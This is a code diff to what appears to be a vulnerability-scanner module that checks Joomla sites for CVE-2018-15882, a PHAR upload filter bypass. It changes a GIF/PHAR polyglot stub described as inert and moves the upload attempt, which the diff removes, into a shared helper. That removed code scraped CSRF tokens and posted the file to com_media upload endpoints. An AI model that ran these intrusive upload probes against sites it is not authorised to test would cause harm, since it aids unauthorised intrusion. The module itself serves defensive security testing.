@@ -1,12 +1,11 @@
 from __future__ import annotations
 
-import re
 from typing import Any
 
-from ...core.http import HttpSession, normalize_url
 from ...core.probes import rand_str
 from ...core.versions import parse_version_safe
 from .advisory import passive_core_finding
+from .joomla_media_probe import probe_media_upload
 
 CVE_ID = "CVE-2018-15882"
 NAME = "Joomla InputFilter PHAR upload bypass"
@@ -33,70 +32,24 @@ def passive_check(joomla_version: str | None):
     return finding
 
 
-def _csrf_token(body: str) -> str | None:
-    patterns = (
-        r'<input[^>]+name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']',
-        r'["\']csrf\.token["\']\s*:\s*["\']([a-f0-9]{32})["\']',
-    )
-    for pattern in patterns:
-        match = re.search(pattern, body, re.IGNORECASE)
-        if match:
-            return match.group(1)
-    return None
-
-
 def build_inert_phar_stub(marker: str) -> bytes:
     """Build a non-executing image/polyglot that exercises the missing PHAR-stub filter."""
-    return f"GIF89a\n{marker}\n<? __HALT_COMPILER(); ?>\n".encode()
+    return f"GIF89a\n{marker}\n<?php __HALT_COMPILER(); ?>\n".encode()
 
 
 def probe_upload(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict[str, Any]:
-    base = normalize_url(target_url)
-    session = HttpSession(base_url=base, timeout=timeout, proxy=proxy)
     marker = f"PROOFCMS_PHAR_{rand_str(12)}"
     filename = f"proofcms-{rand_str(8)}.gif"
     payload = build_inert_phar_stub(marker)
-    attempts: list[str] = []
-
-    pages = (
-        "/index.php?option=com_media&view=images&tmpl=component",
-        "/administrator/index.php?option=com_media&view=images&tmpl=component",
-        "/",
+    return probe_media_upload(
+        target_url,
+        filename=filename,
+        payload=payload,
+        marker=marker,
+        content_type="image/gif",
+        timeout=timeout,
+        proxy=proxy,
     )
-    candidates: list[tuple[str, str | None]] = []
-    for page in pages:
-        response = session.get(page)
-        candidates.append((page, _csrf_token(response.get("body", ""))))
-
-    endpoints = (
-        "/index.php?option=com_media&task=file.upload&tmpl=component",
-        "/administrator/index.php?option=com_media&task=file.upload&tmpl=component",
-    )
-    for source, token in candidates:
-        fields: dict[str, str] = {"folder": "images"}
-        if token:
-            fields[token] = "1"
-        for endpoint in endpoints:
-            upload = session.post(
-                endpoint,
-                fields=fields,
-                files={"Filedata": (filename, payload, "image/gif")},
-            )
-            proof_url = f"{base}/images/{filename}"
-            proof = session.get(proof_url)
-            attempts.append(
-                f"token_source={source},token={'yes' if token else 'no'},"
-                f"upload={upload.get('status', 0)},proof={proof.get('status', 0)}"
-            )
-            if proof.get("status") == 200 and marker in proof.get("body", ""):
-                return {
-                    "accepted": True,
-                    "proof_url": proof_url,
-                    "uploaded_filename": f"images/{filename}",
-                    "attempts": attempts,
-                }
-
-    return {"accepted": False, "attempts": attempts}
 
 
 def check(
@@ -132,11 +85,22 @@ def check(
     else:
         finding.status = "NOT_CONFIRMED"
         finding.confidence = "MEDIUM"
+        surface = proof.get("surface_found", False)
         finding.detail = (
-            "The prepared inert PHAR-stub upload was not publicly retrievable. The affected InputFilter may still "
-            "be present, but this installation did not expose a usable legacy media upload surface. Attempts: "
+            "The prepared inert PHAR-stub upload was not publicly retrievable. "
+            + (
+                "A live anonymous com_media upload form was found, but this payload was rejected or discarded. "
+                if surface
+                else "No compatible anonymous com_media upload form was exposed. "
+            )
+            + "The affected InputFilter may still be present. Attempts: "
             + "; ".join(proof.get("attempts", []))
         )
+        finding.evidence = {
+            "upload_surface_found": surface,
+            "write_reported": proof.get("write_reported", False),
+            "readback_verified": False,
+        }
     return finding
 
 
@@ -151,7 +115,7 @@ def metadata() -> dict[str, Any]:
         "exploit_available": True,
         "exploit_modes": ["aggressive"],
         "intrusive": True,
-        "module_version": "1.1.0",
+        "module_version": "1.2.0",
         "last_reviewed": "2026-10-02",
         "updated": "2026-10-02",
         "required_detectors": [],
